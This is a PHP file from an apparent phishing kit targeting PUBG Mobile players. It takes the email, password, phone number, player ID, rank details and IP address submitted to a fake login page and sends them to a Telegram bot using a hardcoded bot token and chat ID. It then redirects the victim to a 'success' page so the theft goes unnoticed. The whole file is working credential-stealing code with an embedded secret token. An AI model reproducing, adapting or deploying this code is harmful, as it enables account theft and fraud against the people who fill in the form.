<?php

$username = $_POST['email'];
$password = $_POST['password'];
$phone = $_POST['phone'];
$login = $_POST['login'];
$playid = $_POST['id'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$rpt = $_POST['rpt'];
$rpl = $_POST['rpl'];

$platform = $_POST['platform'];
$country = $_POST['country'];
 require 'js-zone/success.php';
 $ip =$_SERVER['REMOTE_ADDR']
;$apiToken = "1194711721:AAEl_RmnfYw4ZaaaeBmU_N0KYx1GRDzTHtM";
$chat = "1256484091";
$data = [
    'chat_id' => $chat,
    'text' => "❄⊚-----------------------------------⊚❄
☠ PUBG Mobile Account ☠
 
• Email :- $username
• Pass  :- $password
• Tell.U :- $phone
• Login :- $login
• PlayID:- $playid
• Level  :- $level
• IP        :- $ip
• Point  :- $tier
• RP.T    :- $rpt
• RP.L    :- $rpl
By : @mrxsc
❄⊚-----------------------------------⊚❄"];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

?>



<html> 
  <head> 
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159654279-2"></script> 
<script> 
  window.dataLayer = window.dataLayer || []; 
  function gtag(){dataLayer.push(arguments);} 
  gtag('js', new Date()); 
 
  gtag('config', 'UA-159654279-2'); 
</script> 
 
    <meta http-equiv="Refresh" content="0; url='success.php'" /> 
  </head> 
  <body> 
  </body> 
</html>